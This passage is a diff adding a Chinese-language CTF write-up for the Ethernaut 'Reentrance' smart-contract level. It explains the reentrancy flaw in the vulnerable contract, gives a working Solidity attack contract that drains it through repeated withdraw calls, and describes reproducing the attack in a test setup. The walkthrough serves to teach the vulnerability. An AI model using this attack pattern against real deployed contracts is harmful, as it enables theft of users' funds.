@@ -758,3 +758,99 @@ king和owner目前都是0x5B...
 
 这样别人再转多的钱 也无法成为king了
 
+# Reentrance
+
+```
+题目目的：
+The goal of this level is for you to steal all the funds from the contract.
+这一关的目标是让你窃取合约中的所有资金。
+```
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+//import "openzeppelin-contracts-06/math/SafeMath.sol";
+//改成远程引入方便我们调试，懒得下文件
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+很经典的重入漏洞，转账msg.sender.call{value: _amount}("");写在balances[msg.sender] -= _amount;之前，如果转账的目标地址是合约，那就会触发目标合约的fallback方法或者receive方法，这里就会将代码执行的控制权转移到其他合约，如果目标合约一直调用withdraw方法就会掏空合约里面的钱
+
+攻击代码：
+
+```
+contract Attack {
+    Reentrance public reentranceContract; 
+
+    // 初始化合约地址
+    constructor(Reentrance _reentranceContract) public  {
+        reentranceContract = _reentranceContract;
+    }
+
+    // 回调函数，用于重入攻击Reentrance合约，反复的调用目标的withdraw函数
+    receive() external payable {
+        reentranceContract.withdraw(1);
+    }
+
+    // 攻击函数，调用时 msg.value 设为 1 ether
+    function attackReentrance() external payable {
+        reentranceContract.withdraw(1);
+    }
+}
+```
+
+复现：
+
+用户1部署合约，调用donate先存入5 wei到合约
+
+![image-20240415091700586](README.assets/image-20240415091700586.png)
+
+![image-20240415091729306](README.assets/image-20240415091729306.png)
+
+目标就是偷走这里面的5 wei
+
+用户2部署攻击合约：
+
+献给攻击合约存入1 wei，要满足balances[msg.sender] >= _amount条件
+
+![image-20240415091902146](README.assets/image-20240415091902146.png)
+
+然后执行attackReentrance
+
+可以看到余额为0了
+
+![image-20240415092213966](README.assets/image-20240415092213966.png)
+
+且攻击合约余额为很大值，这里估计是整数溢出了，不过这里查看余额是全部都过来了，我演示截图多存了一些，正常来说是6 wei
+
+![image-20240415092512314](README.assets/image-20240415092512314.png)
+
+
+
